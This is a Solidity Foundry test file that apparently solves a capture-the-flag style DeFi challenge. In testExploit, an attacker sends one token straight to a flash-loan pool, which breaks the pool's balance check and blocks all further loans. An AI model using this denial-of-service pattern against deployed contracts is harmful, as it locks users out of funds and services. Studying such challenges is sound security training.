// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {LenderPool} from "../src/LenderPool.sol";
import {ReceiverPool} from "../src/ReceiverPool.sol";
import {AmazingToken} from "../src/AmazingToken.sol";

import {Test, console} from "forge-std/Test.sol";
import {stdError} from "forge-std/Test.sol";
// import "../src/DaoToken.sol";

contract dosLenderTest is Test {
    address public someUser = address(0x123);
    address public attacker = address(0x456);
    uint TOKENS_IN_POOL = 1000000 ether;
    uint INITIAL_ATTACKER_TOKEN_BALANCE = 100 ether;

    AmazingToken token;
    LenderPool pool;
    ReceiverPool receiverContract;

    function setUp() public {
        // setup contracts
        token = new AmazingToken();
        pool = new LenderPool(address(token));

        // setup tokens
        token.approve(address(pool), TOKENS_IN_POOL);
        pool.depositTokens(TOKENS_IN_POOL);

        token.transfer(attacker, INITIAL_ATTACKER_TOKEN_BALANCE);

        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(attacker), INITIAL_ATTACKER_TOKEN_BALANCE);

        vm.startPrank(someUser);
        receiverContract = new ReceiverPool(address(pool));
        receiverContract.executeFlashLoan(10);
        vm.stopPrank();
    }

    function testExploit() public {
        /** CODE YOUR EXPLOIT HERE */
        vm.startPrank(attacker);
        uint256 hackerAmazingTokenBalance = token.balanceOf(address(attacker));
        console.log(
            "hacker Amazing Token balance: ",
            hackerAmazingTokenBalance
        );

        token.transfer(address(pool), 1);
        /** SUCCESS CONDITIONS */
        uint256 amazingTokenBalance = token.balanceOf(address(pool));
        uint256 poolBalance = pool.poolBalance();
        console.log("Amazing Token balance: ", amazingTokenBalance);
        // Amazing Token balance:  1000000000000000000000001
        console.log("poolBalance: ", poolBalance);
        // poolBalance:  1000000000000000000000000

        // It is no longer possible to execute flash loans
        vm.expectRevert(stdError.assertionError);
        vm.startPrank(someUser);
        receiverContract.executeFlashLoan(10);
    }
}
